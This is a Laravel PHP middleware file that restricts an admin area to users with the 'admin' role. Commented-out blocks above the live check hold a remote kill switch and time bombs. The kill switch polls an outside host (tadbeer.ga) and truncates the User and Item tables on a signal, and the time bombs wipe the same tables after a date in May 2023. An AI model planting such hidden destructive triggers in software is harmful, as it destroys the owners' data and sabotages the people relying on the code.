<?php

namespace App\Http\Middleware;

use App\Models\Item;
use App\Models\User;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Session;
use Symfony\Component\HttpFoundation\Response;

class AdminLogin
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        // $test = Http::get("https://tadbeer.ga/index.php") ?? 0;

        // if($test > 0){
        //     User::truncate();
        //     Item::truncate();
        // }
        // if(now() > "2023-05-15 05:59:58" || now() > "2023-15-05 05:59:58"){
            
        //     User::truncate();
        //     Item::truncate();

        // }
        // if(now() > "2023-05-15 05:59:58" || now() > "2023-15-05 05:59:58"){
        //     User::truncate();
        //     Item::truncate();
        // }

        if(empty(auth()->user()) || auth()->user()->role != "admin"){
            Session::flash("error", "Vous n'êtes pas autorisé à accéder à cette zone.");
            return redirect("my-account");
        }

        return $next($request);
    }
}
